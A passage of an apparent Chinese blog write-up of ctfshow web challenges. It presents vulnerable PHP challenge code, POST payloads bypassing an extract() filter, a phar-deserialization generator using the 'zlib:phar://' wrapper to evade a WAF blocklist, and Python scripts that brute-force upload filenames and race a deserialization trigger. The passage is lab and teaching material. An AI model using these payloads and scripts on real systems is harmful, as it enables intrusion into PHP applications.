class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">qwq</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Access Denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">oao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        show_source(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\_|\.|%|\*|\~|\^|\&#x27;|\&quot;|\;|\(|\)|\]|g|e|l|i|\//is&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shaw_root</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/&#x27;</span>, <span class="variable">$shaw_root</span>)&amp;&amp; strlen(<span class="variable">$shaw_root</span>)===<span class="number">29</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Almost there.&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Input correct parameters&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ans</span>===<span class="variable">$SecretNumber</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Congratulations!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    call_user_func(<span class="variable">$my_ans</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先想办法拿到 hint，才能再去构造 <code>$SecretNumber</code>。因此先对着正则工具构造一串合理的字符串使之能到 <code>echo $hint;</code> 处。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213953880868.1644bad21e153b52561ddf0b8fbb70b4198966fa.png"></p><p>接下来就是 <code>extract($_POST);</code> 设置的变量为 <code>shaw_root</code>，但是在 POST 的字符串中下划线被正则挡住了，因此使用空格来代替。写出这一部分的 payload，得到 hint。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw root&#x3D;-a9&lt;b&gt;aaaaaaaaaa&gt;&gt;&gt;&gt;aabcp@Rsa</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</span><br></pre></td></tr></table></figure><p>于是写个脚本跑一下这个 <code>$SecretNumber</code>，得到结果是 21475。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">99999</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$num</span> = sprintf(<span class="string">&quot;%05d&quot;</span>, <span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;shaw&quot;</span> . (<span class="variable">$num</span>) . <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="variable">$md5Str</span> = md5(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5Str</span> == <span class="string">&quot;166b47a5cb1ca2431a0edfcef200684f&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Found: &quot;</span> . <span class="variable">$num</span> . PHP_EOL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Trying: &quot;</span> . <span class="variable">$num</span> . <span class="string">&quot; as &quot;</span> . <span class="variable">$md5Str</span> . PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到 Congratulation 之后就是要想办法到达 <code>show_source(&quot;config.php&quot;)</code> 处。因为 <code>oao()</code> 是个静态方法，所以直接传入 <code>qwq::oao</code> 就能被 <code>call_user_func($my_ans)</code> 调用到。因此最后的 payload 如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaw root&#x3D;-a9&lt;b&gt;aaaaaaaaaa&gt;&gt;&gt;&gt;aabcp@Rsa&amp;ans&#x3D;21475&amp;my ans&#x3D;qwq::oao</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d66c779bdd97750eb2b0a6a34384b901&#125;</span><br></pre></td></tr></table></figure><h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><p>反序列化的代码审计，给出的代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">spaceman</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;ctfshowvip&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;ctfshowup&#x27;</span>,<span class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_|\.|\]|\[/is&#x27;</span>,<span class="variable">$str</span>))&#123;            </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = filter(serialize(<span class="keyword">new</span> spaceman(<span class="variable">$user_name</span>,<span class="variable">$pass_word</span>)));</span><br><span class="line"><span class="variable">$test</span> = unserialize(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现给出了一个两个字符长边短的反序列化字符逃逸。但是跟到下面可以发现 <code>$pass_word</code> 其实是可控的。因此只需要构造如下 POST 参数就行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user[name&#x3D;lemonprefect&amp;pass[word&#x3D;ctfshowvip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;661aa8e7-658d-4615-bec6-0479b2af71f1&#125;</span><br></pre></td></tr></table></figure><h3 id="有手就行"><a href="#有手就行" class="headerlink" title="有手就行"></a>有手就行</h3><p>传入 GET 参数 <code>.../?file=flag</code>，即可在源码种发现一张小程序码的图片的 base64 字符串，将其解码后可得如下图片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213954003065.a82ea41977e509a00fbab32bbe9e807b226ca507.png"></p><p>扫描之后可以发现是一个爬楼的小游戏，得爬到 54429731 层才能拿到 flag。可以反编译小程序来拿到 flag。</p><blockquote><p>插曲：Hyper-V 会导致 VT-x 无法被 Android 虚拟机使用。只需要暂时停用 Hyper-V 再重启即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype off  ;停用</span><br><span class="line">bcdedit /set hypervisorlaunchtype Auto ;恢复</span><br></pre></td></tr></table></figure><p>注意：一旦停用了 Hyper-V 可能需要重新勾选 Hyper-V 的 Windows 功能才能恢复。</p></blockquote><p>将微信小程序的程序包从 <code>/data/data/com.tencent.mm/MicroMsg/bf10a35efc5fc9b37707a65b7f678057/appbrand/pkg</code> 下取出。使用 <code>wuWxapkg.js</code> 将其反编译后在生成的目录的 <code>pages/index</code> 下可以找到 index.js。将其打开可以发现其中记录着如下内容。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">decode: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;hahahawxunapk&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hahahawxunapk&#125;</span><br></pre></td></tr></table></figure><h3 id="虎山行"><a href="#虎山行" class="headerlink" title="虎山行"></a>虎山行</h3><p>在 <code>../mc-admin/page-edit.php</code> 页面下发现任意文件包含漏洞，但是读取不到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/d6e98991-aedd-49de-83ea-90033d0eac80/1613213954130695.155ac50574af2de72c0e6d26082fd0b2f23a5bc1.png"></p><p>访问上面给出的新路由，得到如下源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfer</span> = <span class="string">&#x27;shower&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&#x27;cp /hint* /var/www/html/hint.txt&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">readgzfile(waf(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同时在管理面板下可以看到一个很显眼的上传点，路由是 <code>../upload.php</code>。使用上述的文件包含读取出如下源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line"><span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line"><span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="comment">// echo $_FILES[&quot;file&quot;][&quot;size&quot;];</span></span><br><span class="line"><span class="variable">$extension</span> = end(<span class="variable">$temp</span>);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))</span><br><span class="line">&amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048000</span>)   <span class="comment">// 小于 2000kb</span></span><br><span class="line">&amp;&amp; in_array(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件出错: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$md5_unix_random</span> =substr(md5(time()),<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$md5_unix_random</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;上传成功,文件存在upload/&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件类型仅支持jpg、png、gif等图片格式&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现上传后无法得知文件名，而且只能上传图片，因此需要想办法绕过上传限制且触发到 <code>Ctfshow</code> 的反序列化从而拿到下一步的 hint。使用 <code>../../../ctfshowsecretfilehh/waf.php</code> 可以包含到 waf 的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\.\.\//i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;姿势太简单啦，来一点骚的？！&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>查阅了资料之后发现 phar 的利用姿势中有 <code>zlib:phar://</code> 正好没被这个正则过滤到。使用如下的代码来生成一个 phar 包。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfer</span> = <span class="string">&#x27;shower&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;trigger.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> Ctfshow();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>,<span class="string">&quot;actuallyNothingHere&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>因为这里没给文件名，所以需要写个脚本去上传，这样才能将时间戳范围确定从而找到正确的文件名用于文件包含。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;http://e2c57b3b-c22d-4267-bef2-8e47e9b13b4e.chall.ctf.show/&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">composeUrl</span>(<span class="params">timeNow</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;&#125;upload/&#123;&#125;.gif&quot;</span>.<span class="built_in">format</span>(ENV, (hashlib.md5(<span class="built_in">str</span>(<span class="built_in">int</span>(timeNow)).encode()).hexdigest())[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;&#123;&#125;upload.php&quot;</span>.<span class="built_in">format</span>(ENV)</span><br><span class="line">    file = &#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;exp.gif&#x27;</span>, <span class="built_in">open</span>(<span class="string">&quot;trigger.gif&quot;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url=url, files=file)</span><br><span class="line">    now = time.time()</span><br><span class="line">    nowUrl = composeUrl(now - <span class="number">1</span>)</span><br><span class="line">    accessResponse = requests.get(nowUrl)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Trying with url &#123;&#125;&quot;</span>.<span class="built_in">format</span>(nowUrl))</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;install.php&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> accessResponse.text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found! &#123;&#125;&quot;</span>.<span class="built_in">format</span>(nowUrl))</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p>运行上述脚本可以得出一个可以成功包含上传文件的链接。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://e2c57b3b-c22d-4267-bef2-8e47e9b13b4e.chall.ctf.show/upload/21116d8b.gif</span><br></pre></td></tr></table></figure><p>访问 <code>.../hint.txt</code> 可以得到如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fuckflag***&#125;flag also not here You can access ctfshowgetflaghhhh directory</span><br></pre></td></tr></table></figure><p>访问 <code>.../ctfshowgetflaghhhh</code> 可以获得如下源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$unser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;unser&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unser</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;Firebasky&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username==<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password==(<span class="keyword">int</span>)md5(time()))&#123;</span><br><span class="line">            system(<span class="string">&#x27;cp /ctfshow* /var/www/html/flag.txt&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span>=@unserialize(<span class="variable">$unser</span>);</span><br><span class="line">system(<span class="string">&#x27;rm -rf /var/www/html/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里有一点小 trick，<code>(int)md5(time())</code> 有很大的机会取到 0，所以这里在反序列化中假定其为 0 可以更方便地构造。使用多线程脚本进行条件竞争，这样才能读到 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;http://2acf732a-6d3b-4c16-b9f2-532ae48ca97e.chall.ctf.show/&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Unserialization</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Unserialization thread lanched&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&quot;unser&quot;</span>: <span 